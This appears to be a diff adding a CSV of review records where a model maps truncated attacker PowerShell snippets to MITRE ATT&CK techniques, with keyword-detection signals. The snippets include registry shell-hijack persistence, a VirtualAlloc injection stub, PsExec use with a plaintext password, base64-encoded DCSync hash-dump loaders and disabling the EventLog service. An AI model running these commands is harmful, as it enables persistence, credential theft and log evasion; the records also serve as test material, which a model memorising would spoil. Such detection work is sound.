@@ -1,0 +1,24 @@
+﻿review_id,event_uid,model_answer,script_chars,signal,tokens_found,script_start
+R01,043d296779be865b,T1547.001,64,no tokens found,,New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
+R02,9f8f52a806d09c57,T1547.001,69,no tokens found,,New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
+R03,a4e1332823fd6bf1,T1547.001,77,no tokens found,,New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;
+R04,2c50cf2f1b5c53c4,T1055,3933,tokens found,VirtualAlloc,"$cFIrwwpZzGzU = @"" [DllImport(""kernel32.dll"")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); ["
+R05,381e058a0f2143f9,T1547.001,91,no tokens found,,"Set-ItemProperty -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""(Default)"""
+R06,488a1b50569679ad,T1547.001,104,no tokens found,,"Set-ItemProperty -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""DelegateExecute"" -Force"
+R07,2164c88a2853aece,T1546.003,112,no tokens found,,"Set-Alias -Name rcie -Value Register-CimIndicationEvent -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
+R08,e0425ce1831105be,T1546.003,101,no tokens found,,"Set-Alias -Name ncim -Value New-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
+R09,24a45fa0cb2f0703,T1547.001,33,no tokens found,,Invoke-Persistence -PersistStep 1
+R10,a8ec4e12bc384437,T1547.001,33,no tokens found,,Invoke-Persistence -PersistStep 2
+R11,50259f5e76d14ce7,T1546.003,112,no tokens found,,"Set-Alias -Name rcie -Value Register-CimIndicationEvent -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
+R12,67d71c9a696f0eac,T1546.003,101,no tokens found,,"Set-Alias -Name ncim -Value New-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
+R13,2120d356ca88c930,T1021.002,111,tokens found,psexec,".\PsExec64.exe -accepteula \\NASHUA -u ""dmevals\pbeesly"" -p ""Fl0nk3rt0n!T0by"" -i 2 ""C:\Windows\Temp\python.exe"""
+R14,d2ea07bf752be380,T1021.002,111,tokens found,psexec,".\PsExec64.exe -accepteula \\NASHUA -u ""dmevals\pbeesly"" -p ""Fl0nk3rt0n!T0by"" -i 2 ""C:\Windows\Temp\python.exe"""
+R15,4fb1ebbbefcec43e,T1546.003,112,no tokens found,,"Set-Alias -Name rcie -Value Register-CimIndicationEvent -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
+R16,a2ef8257c4caaccc,T1546.003,101,no tokens found,,"Set-Alias -Name ncim -Value New-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
+R17,10e28166046adcc9,T1003.006,2548,no tokens found,,"IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""DQpmdW5jdGlvbiBJbnZva2UtRGNTeW5jSGFzaER1bXAgew0KICA8Iw0KICAgIC5TWU5PUFNJUw0KICAg"
+R18,15638622806177d4,T1003.006,2288,no tokens found,,"IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""DQpmdW5jdGlvbiBJbnZva2UtRGNTeW5jQWxsIHsNCiAgPCMNCiAgICAuU1lOT1BTSVMNCiAgICAgIFVz"
+R19,1bc2a65f2f314436,T1003.006,1597,tokens found,dcsync,function Invoke-DcSyncAll { <# .SYNOPSIS Use the DCSync functionality to DCSync every user that's present in the DC. It is recommended that this script be invok
+R20,4d3f8fd71a731ced,T1003.006,1184,no tokens found,,"IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""DQpmdW5jdGlvbiBJbnZva2UtRGNTeW5jIHsNCiAgPCMNCiAgICAuU1lOT1BTSVMNCiAgICAgIFVzZSB0"
+R21,565fa9197f8b105b,T1003.006,788,tokens found,dcsync,function Invoke-DcSync { <# .SYNOPSIS Use the DCSync functionality to DCSync a single user from the target domain. .PARAMETER User Specifies the Domain\Username
+R22,959ae6bc397de984,T1003.006,1790,tokens found,dcsync,function Invoke-DcSyncHashDump { <# .SYNOPSIS Use the DCSync functionality to dump every user hash from the DC. This is basically attempting to be a hashdump fu
+R23,71baed215173a602,T1562.002,48,tokens found,Set-Service; eventlog,Set-Service -Name EventLog -StartUpType Disabled
